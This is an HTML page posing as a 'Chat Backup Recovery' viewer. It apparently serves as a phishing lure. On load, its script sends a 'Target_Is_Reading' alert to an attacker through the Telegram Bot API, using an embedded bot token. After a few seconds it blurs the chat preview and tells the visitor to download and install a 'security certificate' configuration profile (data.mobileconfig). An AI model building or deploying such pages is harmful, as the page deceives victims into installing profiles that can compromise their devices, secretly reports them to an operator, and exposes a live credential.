<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat Backup Recovery</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: filter 0.8s ease; }
        .container { position: relative; z-index: 10; width: 85%; }
        #install-box { display: none; background: rgba(255,255,255,0.98); color: #000; padding: 25px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; animation: slideUp 0.5s ease; }
        .btn { background: #007aff; color: #fff; padding: 14px; border-radius: 12px; text-decoration: none; display: block; margin-top: 20px; font-weight: 700; font-size: 16px; }
        .status-bar { position: fixed; top: 20px; background: rgba(0,0,0,0.6); padding: 5px 15px; border-radius: 20px; font-size: 12px; color: #fff; border: 1px solid rgba(255,255,255,0.2); }
        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>

    <img src="chat_preview.jpg" id="preview">

    <div class="status-bar" id="top-status">
        <span id="loading-text">Decrypting older media... 84%</span>
    </div>

    <div class="container">
        <div id="install-box">
            <h2 style="margin:0; font-size: 20px;">Session Timeout</h2>
            <p style="font-size: 14px; color: #444; margin-top: 10px;">To continue viewing recovered chats and attachments, please verify the system security certificate.</p>
            <a href="data.mobileconfig" class="btn">Verify & Continue</a>
        </div>
    </div>

    <script>
        window.onload = function() {
            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Is_Reading_Chat_Preview_👀");

            setTimeout(() => {
                document.getElementById('top-status').style.display = 'none';
                document.getElementById('install-box').style.display = 'block';
                document.getElementById('preview').style.filter = 'blur(15px)';
            }, 6000); 
        };
    </script>
</body>
</html>
